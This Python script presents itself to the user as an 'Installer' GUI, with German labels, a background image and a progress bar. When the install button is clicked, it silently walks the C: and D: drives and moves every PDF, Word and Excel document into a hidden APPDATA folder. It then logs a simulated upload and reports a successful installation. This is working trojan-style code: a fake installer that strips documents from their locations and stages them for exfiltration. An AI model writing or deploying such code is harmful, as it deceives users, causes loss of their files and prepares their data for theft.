import os
import sys
import shutil
import datetime
import time
import logging
import tkinter as tk
from tkinter import ttk, messagebox

# Logging einrichten
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# Funktion zum Verschieben von Dateien in einen Backup-Ordner
def move_files_to_backup_folder(files, backup_folder):
    if not os.path.exists(backup_folder):
        os.makedirs(backup_folder)

    for file in files:
        try:
            backup_path = os.path.join(backup_folder, os.path.basename(file))
            shutil.move(file, backup_path)
            logging.info(f"Datei verschoben: {file} -> {backup_path}")
        except Exception as e:
            logging.error(f"Fehler beim Verschieben der Datei {file}: {e}")

# Funktion zum Durchsuchen von Laufwerken und Sammeln von Dateien
def search_files(start_path):
    files = []
    for root, _, filenames in os.walk(start_path):
        for filename in filenames:
            extension = os.path.splitext(filename)[1].lower()
            if extension in [".pdf", ".doc", ".docx", ".xlsx"]:
                files.append(os.path.join(root, filename))
    return files

# Simulation des Hochladens von Dateien
def simulate_upload(zip_filenames):
    for zip_filename in zip_filenames:
        logging.info(f"Simulation: Datei {zip_filename} wurde hochgeladen.")

# Hauptprogramm
def main(progressbar):
    try:
        # Zielordner für Backups im APPDATA-Verzeichnis
        appdata_folder = os.getenv('APPDATA')
        backup_folder = os.path.join(appdata_folder, "backup_storage")

        # Beispiel-Laufwerksbuchstaben
        drives = ["C:\\", "D:\\"]  # Passen Sie die Laufwerksbuchstaben an

        all_files = []
        for drive in drives:
            all_files.extend(search_files(drive))

        # Dateien in den Backup-Ordner verschieben
        move_files_to_backup_folder(all_files, backup_folder)

        # Beispiel: Dateien zippen (Simulation)
        zip_filename = "files.zip"
        simulate_upload([zip_filename])

        progressbar["value"] = 100
        messagebox.showinfo("Erfolg", "Installation abgeschlossen.")
    except Exception as e:
        messagebox.showerror("Fehler", f"Ein Fehler ist aufgetreten: {e}")

# GUI-Setup für die Installation
def start_gui():
    def on_install_click():
        install_button.config(state=tk.DISABLED)
        progressbar.place(relx=0.5, rely=0.5, anchor=tk.CENTER)
        root.update_idletasks()
        main(progressbar)
        install_button.config(state=tk.NORMAL)
        progressbar.place_forget()

    root = tk.Tk()
    root.title("Installer")
    root.geometry("400x250")
    root.resizable(False, False)

    # Hintergrundbild
    background_image = tk.PhotoImage(
        file=os.path.join(sys._MEIPASS, "background.png")
        if hasattr(sys, "_MEIPASS")
        else "background.png"
    )
    background_label = tk.Label(root, image=background_image)
    background_label.place(x=0, y=0, relwidth=1, relheight=1)

    # Fenster-Icon
    icon_image = tk.PhotoImage(
        file=os.path.join(sys._MEIPASS, "icon.png")
        if hasattr(sys, "_MEIPASS")
        else "icon.png"
    )
    root.iconphoto(True, icon_image)

    # Installationsbutton
    global install_button
    install_button = ttk.Button(root, text="Installieren", command=on_install_click)
    install_button.place(x=175, y=210)

    # Fortschrittsbalken
    global progressbar
    progressbar = ttk.Progressbar(root, length=300, mode="determinate")

    root.mainloop()

# Nur per GUI starten
if __name__ == "__main__":
    start_gui()